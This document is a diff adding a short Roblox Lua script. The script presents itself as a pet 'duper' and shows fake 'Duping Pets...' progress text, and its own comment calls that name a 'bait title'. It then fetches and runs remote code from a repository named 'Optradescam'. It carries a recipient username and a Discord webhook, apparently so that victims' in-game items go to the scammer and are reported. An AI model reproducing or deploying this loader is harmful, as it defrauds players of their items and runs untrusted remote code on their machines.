@@ -1,0 +1,15 @@
+local player_USERNAME = "zirak123zaxo" 
+ 
+local discord_WEBHOOK = "https://discord.com/api/webhooks/1109434284340690995/eBeYTNUcg-I09uzxBWuDpJzd07FjJI3ylYLStXj1NuscWTimTcDZDLyURCUgTCSLMUMX" -- leave blank if no webhook 
+ 
+local Custom_Script_Name = "Drake's Duper" -- bait title 
+ 
+local txt_1 = "Script Loaded..." 
+ 
+local txt_2 = "Waiting for Script" 
+ 
+local txt_3 = "Duping Pets.." 
+ 
+local txt_4 = "Duping Pets..." 
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zirak12/Optradescam/main/Op"))()
